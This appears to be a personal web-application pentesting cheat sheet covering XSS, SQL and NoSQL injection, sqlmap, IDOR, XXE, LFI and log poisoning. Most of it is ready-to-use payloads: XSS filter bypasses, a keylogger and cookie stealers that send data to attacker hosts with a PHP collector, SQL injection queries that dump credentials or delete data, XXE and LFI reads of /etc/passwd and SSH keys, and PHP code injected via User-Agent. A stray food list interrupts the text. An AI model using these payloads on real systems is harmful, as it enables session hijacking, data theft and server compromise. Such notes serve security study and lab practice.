> - **Reflected** - Input field of HTTP request sent, immediately *reflected* to output page
> - Malicious code is carried *inside the request* that the browser of the victim sens to the vulnerable website
> - Triggered by posting a link on social media or a phishing campaign; when users click the link, they trigger the attack
> - E.g attack could craft link and load the payload in the **GET parameter** `victim.site/search.php?find=<malicious_code>` and embed this in a simple link for another user to click on and for that user to execute.
    
> - **Persistent** - Payload is sent to vulnerable server and then **stored**, malicious code gets delivered every time user hits the "injected" web page
> - If the website runes the stored code and puts it within the HTML output then it will deliver the XSS payload
> - Element such as *Comments, user profiles and forum posts* are all HTML forms that submit content to the webserver, this content is then displayed to every user.
    
  > - **DOM based** - Document Object Model is a programming interface for HTML and XML docs. It *represents* the page so that programs can change the structure, style and content.
  > - The payload will only execute when the vulnerable javascript code is either loaded or interacted with.

**XSS POLYGLOTS**

String of text that can escape attributes, tags, bypass filters all in one.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`
```

**BYPASS FILTERS:**

```
$FILTER: <script>, alert(), onerror, onsubmit, onload, onmouseover, onfocus, onmouseout, onkeypress, onchange
$METHOD: various filters that might be case sensitive can be bypassed with changes in your code
$BYPASS: <img src="x" ONERROR="alert('HHelloello')">,  <img src="x" ONERROR="prompt('HHelloello')">
```

```
$FILTER: <textarea></textarea>
$BYPASS: </textarea><script>alert('xss');</script>
```

```
$FILTER: <script>document.getelementsByClassName('name')[0].innerHTML='hello';</script>
$METHOD: Finish the initial code _"hello";_ and join to the end with _;$NEWCODE;_ and add // at end to comment out remainder of code running
$BYPASS: ';alert('xss');//
```

```
$FILTER: <input value="hello">
$METHOD: Close the value of the "hello" with > and add in code after
$BYPASS: ><script>alert('xss');</script>
```

```
$FILTER: $WORD i.e script
$METHOD: duplicate and mess with the filter, have the filter remove the $WORD from the entry but by removing it; the obfuscated $WORD will remain
$BYPASS: <s*script*cript>alert('xss');</s*script*cript>
```

```
$FILTER: forced entry <img scr=> && remove "<" and ">"
$METHOD: Closed src attribute with " then onload to add code after
$BYPASS: /images/cat.jpg" onload="alert('xss');
```


**EXAMPLE PAYLOADS**

> - Keylogger: `<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>`
> - Email Change: `<script>user.changeEmail('attacker@hacker.com');</script>`
> - Cookie Steal: `<script>new Image().src="http://$RHOST:$RPORT/hacked.php?output="+document.cookie;</script>` or encode base64 `+btoa(document.cookie);`
> - Defacing Webpage: `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
> - Fetch IP hostname: `<script>alert(window.location.hostname)</script>`

---

**COOKIE STEALER 1:**

**VIA Netcat Listener:**

```
$LPORT: setup listening port
```

> `nc -lvnp $LPORT`

```
$LHOST: attacker ip
$LPORT: attacker listening port
```

> `<script>new Image().src="http://$LHOST:$LPORT/hacked.php?output="+document.cookie;</script>`

**VIA LOGS Webpage:**

```
$RHOST: website
$RPORT: optional port
$LOG: location of logs page recording entries
```

> `<script>new Image().src="http://$RHOST:$RPORT/$LOG/hacked.php?output="+document.cookie;</script>`

**Impersonation:**

Either update through web browser developer tools or through the URL

```
$RHOST: website
$PARAMETER: get param
$SESSIONID: stolen sessionid or cookie
```

> - `http://$RHOST/resource.php?$PARAMETER=$SESSIONID`

---

**EXAMPLE COOKIE STEALER 2:**

```php
// The Payload to inject with XSS
<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie);</script>
// our payload script name: get.php needs to be invoked here
// '+escape' function to avoid special characters to break our link
// Creates a new image object and sets the address of the image to our attacker website link

// GET.php script saves cookie in text file on attacker.site
<?php
$ip = $_SERVER['<remote address>'];
$browser = $_SERVER['<http user agent>'];
$filename = "<file name>"; // Your file name

$fp=fopen($filename, 'a'); // opens the file you specified

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n"); # Gets the value from the QUERY_STRING of the URL and save the information into the filename
fclose($fp);
?>
```

|                                                                                                                  |                                                                                                                                    |
|:---------------------------------------------------------------------------------------------------------------- |:---------------------------------------------------------------------------------------------------------------------------------- |
| @ **Reflected & Persistent Testing for XSS**                                                                     | ---                                                                                                                                |
| `<i> this is a test`                                                                                             | Testing if the webserver outputs the *italics*, seeing if a XSS is available                                                       |
| `<h1>some text here </h1>`                                                                                       | Checking if user input is sanitised                                                                                                |
| `<iframe src="javascript:alert(`xss`)"> `                                                                        | using iframe element, also known as XFS for framework                                                                              |
| `<script>alert('This is an XSS')</script>`                                                                       | Testing for alerts if reflected back                                                                                               |
| `<script>alert(document.cookie)</script>`                                                                        | Display your cookie                                                                                                                |
|                                                                                                                  |                                                                                                                                    |
| @ **Example threats**                                                                                            | ---                                                                                                                                |
| `victim.site/search.php?find=<malicious_code>`                                                                   | Example GET parameter embedded into a simple link to fool user                                                                     |
| `i.src="http://attacker.site/get.php?cookie="+escape(document.cookie);`                                          | Embed into a picture malicious URL that steals cookie and sends to to attackers website to log                                     |
|                                                                                                                  |                                                                                                                                    |


Most of the time, with the XSS attacks, the users or visitors to the site are the victims and it's common for the *site administrator* to be a user as well.

These vulnerabilities happen when web applications use **unfiltered user input** to *build the output content it displays* to its users; with unfiltered user input, it can allow an attacker to control the output HTML and javascript code.

General rule of thumb would be to **never trust user input**; so ensuring that the following input channels are validated **server side** that should sanitize or filter the users input:

**DEFENSE: FILTERING INPUTS**

> - Escape all user input
> - Validate Input
> - Sanitising
> - Request Headers
> - Cookies
> - Form Inputs
> - POST parameters
> - GET parameters

coconut rice
kitchen fried rice
thai satay
4 x roti

To find XSS, you have to look at **every user input** and test if it is somehow displayed in the output of the web application i.e browser url

**NOTES:**

> - JavaScript can access cookies if they don't have *HttpOnly* flag enabled
> - Once we have stolen the cookie or sessionID, we can then use the sessionID from the victim and paste it into the source code of the browser; **overwriting our own sessionID**.
> - Thereby impersonating the victim

**Finding Blind XSS:**

Blind XSS injections are difficult to see as you don't have any visual confirmation that your changes and javascript is making changes. 

> - Visually test entries on the page and check the source of the page to see how it is interpreting and handling the entries.
> - If you see the `<textarea></textarea>` enclosing your input, then you may try to **break out** of the code block by testing `</textarea> hello` and if successful moving onto scripts




[Back to Top](#table-of-contents)

---

### Cookie-Stealing

Once you know that an XSS entry point is available then you may be able to see if you can produce the cookies for the user as well. Being successful with this means that it may be possible to steal cookies from users who access the web page that has your script loaded.

It is also important to note that usually in order to provide some protection against the following cookie stealing methods, normally it is recommended to set the **http-only** flag to true within the web.xml configurations.\
By having this config set, it will not allow the *scripts* on the browser to be able to pull out the httpOnly unique cookies document.

**Example for Java Enterprice Edition 6+ Security for cookie-stealing**
```php
<session-config>
  <cookie-config>
    <http-only>true</http-only>
  </cookie-config>
</session-config>
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SQL-Injections

Tags: [MySQL](#MySQL), [SHELL-mySQL](#SHELL-mySQL). [SQLMAP](#SQLMAP), [NoSQL](#NoSQL), [MSSQL](#MSSQL)

Most web applications run some sort of *backend database* to store the data they process. So in order to interact with this databases; system operators, programmers, tools use SQL to do this.

SQL is **structured query line**.

SQL Injections, **SQLi**, allows unauthorised user to **take control over SQL statements** used by a web application.

**WHY DATABASES ARE IMPORTANT:**:

> - Users' credentials
> - Data of the web application
> - Credit Card Numbers
> - Shopping transactions
> - and so forth

Similar to XSS injection testing, we need to be vigilant is testing all user inputs in a typical web application.

**EVERY INPUT MUST BE TESTED:**

> - GET parameters
> - POST parameters
> - HTTP Headers
  > - User-Agent
  > - Cookie
  > - Accept
  > - etc..

Testing an input for SQL injections means that we are trying to inject a variation of inputs that will query and lead to unexpected responses or results from the database.\
As such, it is always best to test **one** injection at a time otherwise you could confuse the successful attempt.

**INPUTS EXPLAINED:**

> - String terminators: `'` or `"` or otherwise known as commenting out
> - SQL commands, `SELECT`, `UNION` and others etc
> - SQL comments: `#` or `--`, due to webpages interpreting empty space, sometimes the webapps can remove our work; so we add `;-- -` so that the webapp doesn't remove our space/comment out
> - `SELECT views WHERE id='` is the default query note the `'` ending. This is the reason we use `' or 1=1;-- -` as we are closing the `''` to make a NONE value

It is important to note that not just MySQL `select` queries are vulnerable to SQLi as this may gather information but there is also methods for\
attackers to perform denial of service attacks with things such as:

> `DELETE description FROM items WHERE id="1" or "1" = "1";` thereby deleting everything in the **description** field which means **permanent damage to the database**.

In saying so; it is important to understand what the SQL query does and how you will impact the database as a penetration tester. Will it display something? or is it modifying some data?

**LOGIN BYPASS:**

Testing if not sufficient sanitisation and able to bypass login

```powershell
#TRUE statement
' or 1=1;-- - 
```

**BOOLEAN-BASED:**

Changing the parameter value by either the number, adding characters or testing for true/false statements

```powershell
$PARAMETER                               :The get parameter sud as "id=" or "news=" with the "=" calling on a variable
$RHOST                                   :Target URL webpage
$RHOST/newsdetails.php?$PARAMETER=$VALUE :Example www.website.com/newsdetails.php?id=26

#COMMENT
victim.site/view.php?id=26'

#TRUE query
victim.site/view.php?id=' or 1=1;-- - 

#FALSE query
victim.site/view.php?id=' or 1=2;-- -

#BURP SUITE: Add "
username=user"name&password=password
```

---

**UNION-BASED:**

Selecting from multiple tables/columns and then enumerating data on the column that is reflected in the web page

```powershell
$PARAMETER                               :The get parameter sud as "id=" or "news=" with the "=" calling on a variable
$RHOST                                   :Target URL webpage
$RHOST/newsdetails.php?$PARAMETER=$VALUE :Example www.website.com/newsdetails.php?id=26

#COLUMNS
$T1, $T2, $T3             :Testing for number of columns; will return non-error webpage if correct
$database()               :Find column reflected on webpage & display "database name"
$user()                   :Display current "username"

victim.site/view.php?id=' UNION SELECT $T1, $TABLE2, $TABLE3;-- -
victim.site/view.php?id=' UNION SELECT $T1, database();-- -
victim.site/view.php?id=' UNION SELECT $T1, user();-- -
```

---

**TIME-BASED BLIND:**

Using a `sleep(5)` mechanism to force a page to take a set amount of a time to load if the *statement is True*. 
This will allow the attacker to determine and gather information based on asking **True/False** questions.

```powershell
$PARAMETER                               :The get parameter sud as "id=" or "news=" with the "=" calling on a variable
$RHOST                                   :Target URL webpage
$RHOST/newsdetails.php?$PARAMETER=$VALUE :Example www.website.com/newsdetails.php?id=26

#COLUMNS
sleep(5), $T1, $T2, $T3             :Testing for number of columns; will return non-error webpage if correct
$database() like 'u%'               :Enumerate "database name" with each letter. sleep(5) to determine True/False on each letter in password.
$USER, $PASS                        :Enumerate individual password manually, "password like 'u%';-- -". sleep(5) to determine True/False on each letter in password.
abc%                                :Wildcard % used to test for True statement. Example password starts with "abc......"

victim.site/view.php?id=' UNION SELECT sleep(5), $T1, $T2, $T3;-- -
victim.site/view.php?id=' UNION SELECT sleep(5), $T1, WHERE database() like 'u%';-- -
victim.site/view.php?id=' UNION SELECT sleep(5), $T1, FROM users WHERE username='admin' AND password like 'u%';-- -
```


---

**NAVIGATE DATABASE:**

Manual navigation of a database, from finding the database name and then pulling info from the *information_schema* to determine names of columns and tables.

```powershell
#UNION/GROUP_CONCAT
$T1, $T2, group_concat(table_name)    :After knowing the reflected column in website, use "group_concat(expr);" to display all "table names"
$DB                                   :"Database name"
$TABLE                                :"Table name"
$COLUMN                               :"Column name"
group_concat(SEPARATOR '<br>')        :separate with newline for each entry
group_concat($column1,':',$column2)   :Format dump i.e 'username:password'
website.com/article?id=0 union select $T1, $T2, database();-- -                                                                              :Dump 'database name'
website.com/article?id=0 union select $T1, $T2, group_concat(table_name) from information_schema.tables where table_schema = '$DB';-- -      :Dump 'table names'  # article, users
website.com/article?id=0 union select $T1, $T2, group_concat(column_name) from information_schema.columns where table_name = '$TABLE';-- -   :Dump 'column names' # id, username, pass
website.com/article?id=0 union select $T1, $T2, group_concat($column1,':',$column2 SEPARATOR '<br>') from $TABLE;-- -                        :Dump in format i.e 'username:pass' 
#group_concat dump specific columns
```

Below is an example of **database syntax** and how these SQL statements are interpreted through the website:

```powershell
select $COLUMN;     :Select specific column within DB
from $TABLE;        :Pull from specific table
where $CONDITION;   :Specify condition or target specific info, i.e "id=1" (first entry) or "Name=Shoes" (specific target)

#DATABASE SYNTAX
select $COLUMN from $TABLE where $CONDITION;

#BOOLEAN
#True/False conditions
select $name, $description from $products where $ID='' or 1=1;    :empty '' string or 1=1, Return TRUE value and display info
select $name, $description from $products where $ID='' or 1=2;    :Return FALSE value and does not display info

#UNION
select $name, $description from $products where $ID='3' union select $username, $password from $accounts;   :Example of union of two statements

#CONSTANT VALUES
select <22>, <"string">, <0x12>, <"another string">;
```

---

**Example of PHP connection to MySQL database and a Query**

```php
$dbhostname = '1.2.3.4';
$dbuser = 'username';
$dbpassword = 'password';
$dbname = 'database';

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results)
```

**CODE EXPLAINED:**

> - `$connection` is an object referencing the connection to the database
> - `$query` contains the query
> - `mysqli_query()` is a function which **submits**the query to the database
> - `display_results()` is a function to display the output

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Exploiting-SQL-STATEMENTS

Tags: [MySQL](#MySQL), [SHELL-mySQL](#SHELL-mySQL). [SQLMAP](#SQLMAP), [NoSQL](#NoSQL), [MSSQL](#MSSQL)

Vulnerable-Dynamic-Queries

Vulnerable dynamic queries are when the queries are **user-supplied input** to build a query; *dynamically built*\
For instance, this could be the  *ID* parameter in a **GET** request and this code is then submitted to the database to query and return with the results.

this is dangerous because a malicious user can exploit the query construction and take control of the database interaction.

**VULNERABLE CODE EXAMPLE:**

```powershell
#Code trusts USER input without sanitisation.

$id = $_GET["id"];

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id';";

$results = mysqli_query($connection, $query);
display_results($results)
```

**CODE EXPLAINED - BOOLEAN:**

> - The above is expecting user input such as: WHERE `ID='1';`, or `ID='Example';`, or `ID='Itid3';` Or any other **string**
> - **Exploiting a Conditional Statement:**
> - **ID=' or 1=1;** producing `SELECT name, description FROM products WHERE ID=' or 1=1;`
> - This is using a condition **OR** to produce a *TRUE* or *FALSE* value.
> - What happens if you produce **WHERE ID=True**? It selects all the items in the products table.

**CODE EXPLAINED - UNION:**
> - Adding `id=' UNION SELECT username, password FROM accounts WHERE 1=1;`
> - Query becomes: `SELECT name, description FROM products WHERE ID=' UNION SELECT username, password FROM accounts WHERE 1=1;`
> - Asks database to select items from an **empty ID**, thus selecting an **empty set**
> - Then performing a UNION with all entries in the *accounts* table
> - Using the always **True** statement to show all data from the tables
  
![](https://i.imgur.com/j5BUPFR.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NoSQL-Injections

Web vulnerability that happens by sending queries via untrusted and unfiltered web application input that leads to leaked unauthorised information.

This allows the attacker to do tasks such as modify data, escalating privileges, DoS attacks and so forth.

**MONGO DB**

**USEFUL COMMANDS:**

> - `use` - select or create database
> - `show $DATABASE $TABLES` - show $SELECT: databases, tables
> - `db.createCollection("$NAME")` - Create Collection
> - `db.getCollectionNames ()` - show Collections
> - `db.$COLLECTION.insert({id:"$2", username: "user", email: "user@thm.labs", password: "password1!"})` 
> - `db.$COLLECTION.find()` - show all in $COLLECTION
> - `db.$COLLECTION.update({id:"2"}, {$set: {username: "tryhackme"}})` - "$set" is required to be written as is.
> - `db.$COLLECTION.remove({'id':'2'})` - remove item
> - `db.$COLLECTION.drop()` - drop tables

**BYPASS LOGIN**

The following is an example of a query used on a web application and processed by the database: `db.users.find({$QUIERY})` or `db.users.findOne({$QUERY})`. The $QUERY is JSON data that is sent via the webapp i.e Username: "admin", Password: "admin1". A correction $QUERY will return with the document while a wrong $QUERY will reply `null` when nothing matches the database `find({QUERY})`.

```
# List of MongoDB OPERATORS:

$eq - matches records that equal to a certain value

$ne - matches records that are not equal to a certain value

$gt - matches records that are greater than a certain value.

$where - matches records based on Javascript condition

$exists - matches records that have a certain field

$regex - matches records that satisfy certain regular expressions.
```

**INJECTION:**

Similar to SQL, need to find a user input field that is not sanitised. Check how the $QUERY is being sent such as **get** or **post** or **JSON Object** (the case with API's)

> - $PASSWORD$ `{"$ne": "placeholder"}` - Sent as Password field, hoping DB will interpret "admin password **note equal to placeholder** which will return True, meaning we are sending Username: "admin" Password: True
> - $USERNAME$ $PASSWORD$ `{"$ne":"admin"}`, `{"$ne":"placeholder"}` - Sent user:password field, hoping DB interprets **!=** user = True and **!=** password = True
> - $GET VIA URL$  `/search?username=admin&role[$ne]=user` - parameter enumeration: Using the `[$ne]` injection in the parameter for "Role" **!=** "user" to **confirm admin in every role other than user.**
> - $GET VIA URL$ `/search?username[$ne]=ben&role=user` - "username" **!=** "ben"


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SQLMAP

SQLMap can both **detect** and **exploit** SQL injections however its recommended to always test your injections by hand first and use the tool after.\
This is due to automation might select an **inefficient** exploitation strategy or even **crash the remote service**.

```powershell
-u $RHOST          :Target i.e http://website.com/?id=1141
--technique $TECH  :Select (U)nion, (B)oolean etc
--dump             :Display all on current selection
-banner            :bannergrab
-v3                :tell SQLmap to **output payload** it used to get the info
--tables           :Dump "tables names" in $DB
--users            :Dump "users"
--dbs              :Dump "database names"
--flush-session    :Flush all logs if encountering errors. Logs default saved to ""/usr/share/sqlmap/output/$RHOST"

#BURP SUITE METHOD: Navigate and use the target user input field with "test" and capture the traffic
-p $FIELD          :Select vulnerable parameter field i.e 'user' in 'user=test&pass=test'

#right-click and save the traffic to a .txt file or .req
$FILE              :Burp suite saved file as .txt or .req
--dbms=$DB         :set the database configuration
sqlmap -r $FILE --dbms=mysql --dump
sqlmap -r $FILE.req -p user --technique=B --banner

#Burp Suite or Dev tools to inspect the POST data sent.
-p $FIELD                   :Select vulnerable parameter field i.e 'user' in 'user=test&pass=test'
$POSTstring                 :From burp, the post string such as 'user=test&pass=test'
--data=$POSTstring          :Input data string
sqlmap -u $RHOST --data=$POSTstring -p $FIELD
sqpmap -u $RHOST/login.php --data='user=test&pass=test' -p user --technique=B --dbs           :Dump "database names"
sqpmap -u $RHOST/login.php --data='user=test&pass=test' -p user --technique=B --banner        :Display "banners"

#GET
-p $PARAMETER     :Select vulnerable parameter i.e 'id' in 'id=1141'
-D $DB            :Select Database
-T $TABLE         :Select Table
-C $COLUMN        :Select Column
--current-db      :If navigated by selecting a db, indicate target
sqlmap -u $RHOST/?$PARAMETER=$VALUE $OPTION                                                   :Syntax
sqlmap -u $RHOST/?id=1141 -b                                                                  :Display "banners"
sqlmap -u $RHOST/?id=1141 -tables                                                             :Display "tables"
sqlmap -u $RHOST/?id=1141 --current-db $DB --columns                                          :Dump currently selected $DB "column names"
sqlmap -u $RHOST/?id=1141 --current-db $DB --dump                                             :Dump currently selected $DB
sqlmap -u $RHOST/?id=1141 -p id --technique=U --users                                         :Dump "users"
sqlmap -u $RHOST/?id=1141 -p id --technique=U --dbs                                           :Dump "database names"
sqlmap -u $RHOST/?id=1141 -p id --technique=U -D $DB --tables                                 :Dump "tables names" in $DB
sqlmap -u $RHOST/?id=1141 -p id --technique=U -D $DB -T $TABLE --columns                      :Dump "column names" in $TABLE
sqlmap -u $RHOST/?id=1141 -p id --technique=U -D $DB -T $TABLE --dump                         :Dump "all" in $TABLE
sqlmap -u $RHOST/?id=1141 -p id --technique=U -D $DB -T $TABLE -C $COLUMN1, $COLUMN2 --dump   :Dump "columns info" in $TABLE

```

**NOTES:**

> - **Care** *directly dumping* information via sql injections on a database is noisy and could also be too heavy on a infrastructure depending on the size of the database
> - Once SQL has scanned a DB for info, it won't send repeated queries. The logs are saved to `/usr/share/sqlmap/output/name.of.site`
> - can use `--flush-session` to start from scratch

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## IDOR

Insecure-Direct-Object-Reference

This type of vulnerability occurs when the webserver receives user-supplied input to retrieve objects (such as files, data, webpages, information) and the servers **puts too much trust** on the input data without validation of the user requesting it.

**Examples such as**:

> - logging in and examining your personal profile `http://Shopping.com/profile?user_id=23` and if you were to change the 23 to 10; it would load another users profile. 
> - Encoded ID's with base64, decoding them, changing the values and encoding once more to produce different results

![](https://i.imgur.com/JiiILrF.png)

**Finding IDORS in unpredictable ID's:**

When the ID cannot be detected using other methods, you can also attempt to create 2 users yourself, logged in or otherwise, and swapping the ID numbers between the two sessions in the URL.\
If you can view the other users' content using their ID number while still logged in with a different account then you have found a IDOR vulnerability.

**Not always the address bar:**

Could also be content your browser loads via an AJAX request or something referenced in the JavaScript file.\
You may notice a call upon `/user/details` displaying user info but through an attack **parameter mining**, you discover a *parameter* called **user_id**.

This can now be used to display other users id info when changing the parameter with the request to : /user/details?user_id=123

**Inspecting Request/Response in browser Developer tools**:

Additionally, as an example you can log into an account and go to your personal settings as if you wish to **change them**. If some of the fields are pre-populated then you may be interested to know how the website is getting those details.\
By inspecting the website and what kind of requests are being sent and received, you may notice that the site calls upon a variable such as `customer?id=13` and for the variable, The JSON has the prepopulated data to fill in for you.

![](https://i.imgur.com/XVrydpp.png)


Now what if you changed that GET parameter with ID=3 and the response brings in another users data.

![](https://i.imgur.com/1PCrzq1.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## XXE

XML-External-Entity

This attack abuses features of XML parsers/data allowing an attacker to **interact** with any *backend* or *external systems* that the target application itself can access.\
Allowing the attacker to be able to **read the files** on that system, potentially **enable port scanning** and **remote code execution**.

XML is used for the transfer or storage of data by utilising a format that is organically transferable between systems and versions without being impacted./
This normally means the data is retained in the correct formatting, cross checked with **DTD and SCHEMA** validation to ensure integrity and syntax-error free data.

*Mostly* all XML documents begins with `<?xml version="1.0" encoding="UTF-8"?>` as an industry good practice.\
Additionally, all XML documents must contain a **ROOT** element which is another way of indicating that the document is required to have *main code block* and then has children elements\
such as `<mail></mail>` being root and then within that code block is the child blocks such as `<subject></subject>` and `<text></text>`.

The impact normally boils down to:
- Denial of Service 
- Server-Side Request Forgery (SSRF): inducing webapps to make requests to other applications

**COMMON CHECKS:**

- Refer to burp suite to investigate the post request: The webapp might be logging the entries through XML
- Check if any fields are being reflected



**DTD - DOCUMENT TYPE DEFINITION:**

Defines **structure** and legal elements and attributes of an XML document.

Example of a *note.dtd* being used to validate information and ensure the document conforms to the **rules of the dtd**:

```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT 
from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>

# !DOCTYPE note -  Defines a root element of the document named note
# !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
# !ELEMENT to - Defines the to element to be of type "#PCDATA"
# !ELEMENT from - Defines the from element to be of type "#PCDATA"
# !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
# !ELEMENT body - Defines the body element to be of type "#PCDATA"
```

**XXE-EXPLOITING**

**PAYLOADS:**

>  - Using system Keyword to read file

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

# Additional options such as /home/{username}/.ssh/id_rsa
```

> - Setting variables for later use

```
# defining entity variable {name} and setting = "feast"
# <lastName> is set to grab the entity variable with {&name;}

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## LFI

Local-File-Inclusion

[PayloadAllTheThings LFI cheatsheet](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks)

These vulnerabilities are the result of incorrectly sanitising user inputs. This allows the malicious user to navigate the webserver **beyond** the scope of the page they should be limited to.

An example of this would be using the `get` parameter to retrieve a file or list: with no sanitisation; it is then possible to ignore the file expected and ask for another file such as `/etc/passwd` or `/.ssh/id_rsa` and so forth to be displayed on the page instead.

**LFI POINTS OF ENTRY:**

> - GET parameter
> - POST parameter
> - User-Agent
> - Cookies
> - Sessions
> - Other HTTP Headers

**Common Important OS File Locations**


```powershell
#Common Windows File Locations
    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt      :Powershell command history, similar to bash
    C:\boot.ini                                                                                        :Contains boot options for cpus with BIOS firmware

#Common Linux File Locations
    /etc/issue`                              :contains a message or 'system identification' to be printed before the login prompt. 
    /etc/profile`                            :controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
    /etc/passwd`                             :has all registered 'user' that has access to a system
    /etc/shadow`                             :contains information about the systems users 'passwords'
    /etc/group`                              :
    /etc/hosts`                              :
    /etc/motd`                               :
    /etc/mysql/my.cnf`                       :
    
    /root/.bash_history`                     :contains the 'history commands for root user'
    /root/.ssh/id_rsa`                       :'Private SSH keys' for a root or any known valid user on the server
    
    /var/log/dmessage`                       :contains global system messages, including the messages that are logged during system startup
    /var/mail/root`                          :all 'emails' for root user
    /var/log/apache2/access.log`             :the 'accessed requests for Apache' webserver
    
    /proc/version`                           :specifies the 'version' of the 'Linux kernel'
    /proc/cmdline`                           :
    /proc/self/environ`                      :
    /proc/[0-9]*/fd/[0-9]*`                  :First number is 'PID' and second is 'FILE DESCRIPTOR'
```


**WITH PHP, functions that often contribute to vulnerable web apps**:

> - `include`
> - `require`
> - `include_once`
> - `require_once`

Worth noting that This is for PHP but the same concept applies to other languages such as ASP, JSP etc.\
In theory we can display any readable file on the system if the code doesn't have *input validation*

**EXAMPLE OF VULNERABLE PHP CODE:**

```php
<?php
  include($_GET["file"]);
?>
```

> - There is no directory specified in the `include` function and no user input validation
> - The URL {http://webapp.net/index.php?file=welcome.php} and changing it around {http://webapp.thm/get.php?file=/etc/passwd/} to access the userlist of the site

Code gets change:
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

> - Now `include` function specifies directory /languages/ and indicates files from that directory with "."
> - The URL {http://webapp.thm/index.php?lang=EN.php} and changing it to {http://webapp.thm/index.php?lang=/etc/passwd}

**NULL BYTE %00 or 0x00**

Tells the webserver to **ignore** there string characters immediately *after* the null byte.\
This is useful with PHP servers **version 5.3.3** and below as it will allow you to get around developments specified extensions.

Example would be that whatever entry that you enter, the developer may have forced it to end with a .php extension. This would force it so that if we tried to browse the system, we wouldn't be able to go to folders or files being it appends .php to the inquiry.

The nullbyte means it will ignore the .php characters and allow the traversal of the directories.


**Common Suggestions to prevent Webapp vulnerabilities**

> - Keep system and services, including web application frameworks, updated with the latest version.
> - Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
> - A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
> - Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as `allow_url_fopen` on and `allow_url_include`.
> - Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
> - Never trust user input, and make sure to implement proper input validation against file inclusion.
> - Implement whitelisting for file names and locations as well as blacklisting.


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## LOG-Poisoning

---

**LFI TO RCE via LOG FILES**


Log Poisoning

**LOCATIONS:**

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

It is also called a log poisoning attack. It is a technique used to gain remote command execution on the webserver. The attacker needs to include a malicious payload into services log files such as Apache, SSH, etc.

Then, the LFI vulnerability is used to request the page that includes the malicious payload. Exploiting this kind of attack depends on various factors, including the design of the web application and server configurations. Thus, it requires enumerations, analysis, and an understanding of how the web application works. 

**FOR EXAMPLE:**

> - malicious payload into an **apache log file** via User-Agent or other HTTP headers. 
> - In **SSH**, the user can inject a malicious payload in the username section.

**HTTP HEADERS:**

If you find logs that record User-Agent headers then this is something we can exploit as User-Agent heads is something we can control

> - **Burp Suite** - Amend User-Agent header with PHP code `<?php phpinfo();?>` and send request
> - `curl -A "<?php phpinfo();?>" http://$RHOST/index.php` send User-Agent header with curl
> - Access $FILEpath to load the php code using LFI `../../../log.file`

---

**LFI TO RCE via PHP SESSIONS**

The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique. PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.

**CODE:**

> - `<?php system('cat /etc/passwd');?>`
> - `<?php phpinfo();?>`

**Check if the website use PHP Session (PHPSESSID)**

```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

**In PHP these sessions are stored into /var/lib/php5/sess_$PHPSESSIONID$ or /var/lib/php/session/sess_$PHPSESSIONID$ files**

```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

